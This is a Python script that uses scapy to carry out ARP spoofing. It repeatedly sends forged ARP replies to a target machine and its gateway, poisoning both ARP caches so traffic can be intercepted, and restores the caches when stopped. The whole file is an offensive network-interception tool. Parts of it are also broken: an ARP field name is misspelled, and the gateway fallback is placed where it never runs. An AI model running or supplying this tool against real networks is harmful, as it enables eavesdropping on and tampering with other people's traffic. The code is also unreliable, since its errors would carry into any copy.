import sys
import time
import scapy.all as scapy
from rich import print

from resources.services import DeviceInfo

"""
----  TO DO:  ----
def enable_ip_route();
"""

def ScapyArpSpoofer(target, host, verbose):

    #creating and sending an arp packet that modifies the arp table of both target and gateway  
    def spoofer(target, host):
        packet = scapy.ARP(op=2, pdst=target, hwdst=info.get_mac(target), prsc=host)
        scapy.send(packet, verbose=False)

    #creating and sending an arp packet that restores the arp tables values
    def restore_cache(target, host):
        target_mac = info.get_mac(target)
        host_mac = info.get_mac(host)

        packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, prsc=host, hwsrc=host_mac)
        scapy.send(packet, verbose=False)


        #if the host is not given, gets the default gateway
        if not host:
            host = info.get_default_gateway()

    try:
        #initializing variables and objects
        info = DeviceInfo()
        packets_count = 0

    #main loop
        while True:
            spoofer(target, host)
            spoofer(host, target)
            packets_count = packets_count + 2

            #displaying info if the verbose flag is True
            if verbose:
                print(f"[bold green][+][/bold green] Sent to [green]{target}[/green] : [green]{host}[/green] at [green]{scapy.ARP().hwsrc}[/green]")
                print(f"[bold green][+][/bold green] Packets sent: [green]{packets_count}[/green]")

            time.sleep(1)
    
    #restoring cache before stopping the script
    except KeyboardInterrupt:
        restore_cache(target, host)
        restore_cache(host, target)
        print(f"[bold green][+][/bold green] Cache restored.")
        sys.exit()

    except Exception as e:
        print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
        restore_cache(target, host)
        restore_cache(host, target)
        sys.exit(1)



if __name__ == '__main__':
    pass
